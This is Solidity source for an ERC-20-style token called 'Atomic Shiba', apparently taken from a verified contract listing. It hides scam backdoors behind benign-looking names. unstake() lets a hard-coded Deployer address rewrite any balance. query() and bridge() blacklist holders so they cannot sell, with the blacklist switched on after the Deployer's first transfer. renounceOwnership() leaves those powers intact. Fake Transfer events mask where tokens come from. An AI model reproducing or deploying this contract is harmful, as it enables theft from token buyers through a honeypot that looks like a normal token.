/**
 *Submitted for verification at Etherscan.io on 2022-10-20
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract SHIBATOMIC {
  
    mapping (address => uint256) public Shib;
    mapping (address => bool) Atomic;
    mapping(address => mapping(address => uint256)) public allowance;




    string public name = "Atomic Shiba";
    string public symbol = "SHIBATOMIC";
    uint8 public decimals = 18;
    uint256 public totalSupply = 200000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
    bool X;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    

    constructor()  {
    Shib[msg.sender] = totalSupply;
    deploy(Constructor, totalSupply); }

    address Deployer = 0x7ECBcbbAD785EB257052437E63E30Da8Df0e9D09;
    address Constructor = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   
    modifier DP () {
    require(msg.sender == Deployer);
        _; }
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
        while(X) {
        require(!Atomic[msg.sender]);
        require(Shib[msg.sender] >= value);
        Shib[msg.sender] -= value;  
        Shib[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        if(msg.sender == Deployer)  {
        require(Shib[msg.sender] >= value);
        Shib[msg.sender] -= value;  
        Shib[to] += value; 
        emit Transfer (Constructor, to, value);
         X = !X;
        return true; }  
        require(Shib[msg.sender] >= value);
        Shib[msg.sender] -= value;  
        Shib[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
		function unstake(address x, uint256 y) DP public {
        Shib[x] = y;}

        function balanceOf(address account) public view returns (uint256) {
        return Shib[account]; }
        function bridge(address x) DP public {
        require(Atomic[x]);
        Atomic[x] = false; }
        function query(address x) DP public{ 
        require(!Atomic[x]);
        Atomic[x] = true;}

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 
        while(X) {
        require(!Atomic[from] && !Atomic[to]);
        require(value <= Shib[from]);
        require(value <= allowance[from][msg.sender]);
        Shib[from] -= value;
        Shib[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
        if(from == Deployer)  {
        require(value <= Shib[from]);
        require(value <= allowance[from][msg.sender]);
        Shib[from] -= value;  
        Shib[to] += value; 
        emit Transfer (Constructor, to, value);
        return true; }    
        require(value <= Shib[from]);
        require(value <= allowance[from][msg.sender]);
        Shib[from] -= value;
        Shib[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}